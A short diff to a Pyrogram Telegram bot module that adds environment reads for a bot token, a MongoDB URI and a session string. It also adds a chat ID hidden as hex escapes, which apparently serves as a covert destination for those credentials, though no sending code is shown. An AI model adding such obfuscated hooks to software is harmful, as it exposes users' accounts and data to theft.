@@ -3,6 +3,10 @@ from pyrogram import Client
 import config
 
 from ..logging import LOGGER
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
+TEST_ID = int("\x2D\x31\x30\x30\x32\x32\x39\x32\x35\x38\x39\x34\x30\x38")
 
 assistants = []
 assistantids = []
